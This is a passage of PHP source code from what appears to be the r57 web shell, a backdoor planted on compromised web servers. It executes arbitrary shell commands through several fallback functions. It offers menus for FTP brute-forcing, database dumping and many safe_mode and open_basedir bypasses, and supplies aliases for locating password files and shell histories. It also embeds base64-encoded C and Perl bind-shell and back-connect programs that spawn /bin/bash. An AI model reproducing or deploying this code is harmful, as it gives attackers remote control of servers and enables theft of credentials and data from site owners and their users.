   @unlink("/tmp/dpc.c");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td class=main bgcolor=#83c809><font face=Verdana size=-2 color=White><div align=center><b>Directive</b></div></font></td><td class=main bgcolor=#83c809><font face=Verdana size=-2 color=White><div align=center><b>Local Value</b></div></font></td><td class=main bgcolor=#83c809><font face=Verdana size=-2 color=White><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td class=main>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td class=main><font face=Verdana size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td class=main><font face=Verdana size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td class=main bgcolor=Black><div align=center><font face=Verdana size=-2 color=White><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td class=main>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td class=main><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td class=main>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td class=main bgcolor=Black><div align=center><font face=Verdana size=-2 color=White><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td class=main>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td class=main><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td class=main>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
$lang=array(
/* --------------------------------------------------------------- */
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_butt3' =>'Bind',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_butt4' =>'Connect',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_butt5' =>'Run',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_butt6' =>'Change',
'eng_text30'=>'Cat file',
'eng_butt7' =>'Show',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions',
'eng_butt8' =>'Test',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass with load file in mysql - edited by Alucar',
'eng_text36'=>'Db . Table',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Database',
'eng_text40'=>'Dump database table',
'eng_butt9' =>'Dump',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_butt10'=>'Save',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_butt11'=>'Edit file',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_butt12'=>'Find',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_butt13'=>'Create/Delete',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'Download files from server',
'eng_butt14'=>'Download',
'eng_text87'=>'Download files from remote ftp-server',
'eng_text88'=>'FTP-server:port',
'eng_text89'=>'File on ftp',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without archivation',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'Users list',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'* use username from /etc/passwd for ftp login and password',
'eng_text100'=>'Send file to remote ftp server',
'eng_text101'=>'Use reverse (user -> resu) login for password',
'eng_text102'=>'Mail',
'eng_text103'=>'Send email',
'eng_text104'=>'Send file to email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_butt15'=>'Send',
'eng_text108'=>'Mail',
'eng_text109'=>'Hide',
'eng_text110'=>'Show',
'eng_text111'=>'SQL-Server : Port',
'eng_text112'=>'Test bypass safe_mode with function mb_send_mail',
'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list',
'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body',
'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()',
'eng_text116'=>'Copy from',
'eng_text117'=>'to',
'eng_text118'=>'File copied',
'eng_text119'=>'Cant copy file',
'eng_text120'=>'SQL-Server',
'eng_text121'=>'Bypass php 5.2.6',
'eng_text122'=>'Test bypass open_basedir, view dir list via fopen (PHP v4.4.0 memory leak) by NST',
'eng_text123'=>'Test bypass open_basedir, view dir list via realpath() (PHP <= 5.2.4)',
'eng_text124'=>'Test bypass open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)',
'eng_text125'=>'Test bypass open_basedir, create file via session_save_path(TMPDIR) (PHP <= 5.2.4)',
'eng_text126'=>'Test bypass open_basedir, add data to file via readfile(php://) (PHP <= 5.2.1, 4.4.4)',
'eng_text127'=>'Test bypass open_basedir, create file via fopen(srpath://) (PHP v5.2.0) ',
'eng_text128'=>'Data',
'eng_text129'=>'Dictionary',
'eng_text130'=>'DoS',
'eng_text131'=>'Danger! Web-daemon crash possible.',
'eng_err0'=>'Error! Can\'t write in file ',
'eng_err1'=>'Error! Can\'t read file ',
'eng_err2'=>'Error! Can\'t create ',
'eng_err3'=>'Error! Can\'t connect to ftp',
'eng_err4'=>'Error! Can\'t login on ftp server',
'eng_err5'=>'Error! Can\'t change dir on ftp',
'eng_err6'=>'Error! Can\'t sent mail',
'eng_err7'=>'Mail send',
'eng_text200'=>'read file from vul copy()',
'eng_text202'=>'where file in server',
'eng_text300'=>'read file from vul curl()',
'eng_text203'=>'read file from vul ini_restore()',
'eng_text204'=>'write shell from vul error_log()',
'eng_text205'=>'write shell in this side',
'eng_text206'=>'read dir',
'eng_text207'=>'read dir from vul reg_glob',
'eng_text208'=>'execute with function',
'eng_text209'=>'read dir from vul root',
'eng_text210'=>'DeZender ',
'eng_text211'=>'::safe_mode off::',
'eng_text212'=>'Close safe_mode with php.ini',
'eng_text213'=>'Close security_mod with .htaccess',
'eng_text214'=>'Admin name',
'eng_text215'=>'IRC server ',
'eng_text216'=>'#room name',
'eng_text217'=>'server',
'eng_text218'=>'write ini.php file to close safe_mode with ini_restore vul',
'eng_text219'=>'Get file to server in safe_mode and change name',
'eng_text220'=>'show file with symlink vul',
'eng_text221'=>'zip file in server to download',
'eng_text222'=>'2 symlink use vul',
'eng_text223'=>'read file from funcution',
'eng_text224'=>'read file from PLUGIN',
'eng_text225' => 'htaccess safemode and open_basedir bypass',
'eng_text226' => 'Write to file',
'eng_text227' => 'Content',
'eng_text228' => 'SSI safe_mode bypass',
'eng_text229' => 'COM functions safe_mode and disable_function bypass',
'eng_text230' => 'ionCube extension safe_mode bypass',
'eng_text231' => 'win32std extension safe_mode bypass',
'eng_text232' => 'win32service extension safe_mode bypass',
'eng_text233' => 'perl extension safe_mode bypass',
'eng_text234' => 'FFI extension safe_mode bypass',
'eng_text137'=>'Useful',
'eng_text138'=>'Dangerous',
'eng_text142'=>'Downloaders',
'eng_butt65'=>'Write',
);
$aliases=array(
'find suid files'=>'find / -type f -perm -04000 -ls',
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
'find config.inc.php files'=>'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
'find config* files'=>'find / -type f -name "config*"',
'find config* files in current dir'=>'find . -type f -name "config*"',
'find all writable files'=>'find / -type f -perm -2 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories'=>'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files'=>'find / -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'find all service.pwd files'=>'find / -type f -name service.pwd',
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
'find all .bash_history files'=>'find / -type f -name .bash_history',
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
'find all .mysql_history files'=>'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=>'lsattr -va',
'show opened ports'=>'netstat -an | grep -i listen',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td class=main bgcolor=Black
><font face=Verdana size=-2><b><div class=tt align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td class=main>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=Black><tr><td class=main>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Webdings color=White>4</font>";
$lb = "<font color=White>[</font>";
$rb = "<font color=White>]</font>";
$font = "<font face=Verdana size=-2>";
$ts = "<table class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";

if(isset($_GET['users']))
 {
 if(!$users=get_users()) { echo "<center><font face=Verdana size=-2 color=White>".$lang[$language.'_text96']."</font></center>"; }
 else
  {
  echo '<center>';
  foreach($users as $user) { echo $user."<br>"; }
  echo '</center>';
  }
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }

if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $unix=0; else $unix=1;
if(empty($dir))
 {
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); }
 if(empty($os)){ $os ="-"; $unix=1; }
 else
    {
    if(@eregi("^win",$os)) { $unix = 0; }
    else { $unix = 1; }
    }
 }
if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr->SearchText(0,0);
    $res = $sr->GetResultFiles();
    $found = $sr->GetMatchesCount();
    $titles = $sr->GetTitles();
    $r = "";
    if($found > 0)
    {
      $r .= "<TABLE width=100%>";
      foreach($res as $file=>$v)
      {
        $r .= "<TR>";
        $r .= "<TD class=main colspan=2><font face=Verdana size=-2><b>".ws(3);
        $r .= (!$unix)? str_replace("/","\\",$file) : $file;
        $r .= "</b></font></ TD>";
        $r .= "</TR>";
        foreach($v as $a=>$b)
        {
          $r .= "<TR>";
          $r .= "<TD class=main align=center><B><font face=Verdana size=-2>".$a."</font></B></TD>";
          $r .= "<TD class=main><font face=Verdana size=-2>".ws(2).$b."</font></TD>";
          $r .= "</TR>\n";
        }
      }
      $r .= "</TABLE>";
    echo $r;
    }
    else
    {
      echo "<P align=center><B><font face=Verdana size=-2>".$lang[$language.'_text56']."</B></font></P>";
    }
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
  }
if(!$safe_mode && strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}
function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
  elseif(@function_exists('proc_open') && @is_resource($f = @proc_open($cfe,array(1 => array("pipe", "w")),$pipes)))
    {
     $res = "";
     if(@function_exists('fread') && @function_exists('feof')){
      while(!@feof($pipes[1])) {$res .= @fread($pipes[1], 1024);}
     }else if(@function_exists('fgets') && @function_exists('feof')){
      while(!@feof($pipes[1])) {$res .= @fgets($pipes[1], 1024);}
     }
     @proc_close($f);
    }
   }
 return htmlspecialchars($res);
}
function get_users()
{
  $users = $rows = array();
    $rows=@explode("\n",moreread($filename));
    if(!$rows[0]){$rows=@explode("\n",readzlib($filename));}
    if(!$rows[0]) return 0;
    foreach ($rows as $string)
     {
     $user = @explode(":",trim($string));
     if(substr($string,0,1)!='#') array_push($users,$user[0]);
     }
  return $users;
}
function err($n,$txt='')
{
echo '<table width=100% cellpadding=0 cellspacing=0><tr><td class=main bgcolor=Black><font color=Red face=Verdana size=-2><div align=center><b>';
echo $GLOBALS['lang'][$GLOBALS['language'].'_err'.$n];
if(!empty($txt)) { echo " $txt"; }
echo '</b></div></font></td></tr></table>';
return null;
}
function perms($mode)
{
if (!$GLOBALS['unix']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function which($pr)
{
$path = '';
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return false; }
}
function in($type,$name,$size,$value,$checked=0)
{
 $ret = "<input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\"";
 if($checked) $ret .= " checked";
 return $ret.">";
}
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or err(0);
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}
function ps($pr)
{global $unix;
$path = '';
if($unix){$path = ex("ps -aux | grep $pr | grep -v 'grep'");}
else{$path = ex("tasklist | findstr \"$pr\"");}
if(!empty($path)) { return $path; } else { return false; }
}
function locate($pr)
{
$path = '';
$path = ex("locate $pr");
if(!empty($path)) { return $path; } else { return false; }
}
function sr($l,$t1,$t2)
 {
 return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";
 }
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this->FilesToSearch = Array();
      for($a=0;$a<count($dirs);$a++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this->text = $text;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }
    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this->text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=>$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this->FilesToSearch as $k=>$filename)
      {
        $this->FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a<@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
            $this->ResultFiles[$filename][$a+1] = $CurString;
            $this->MatchesCount += $count;
            $this->FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
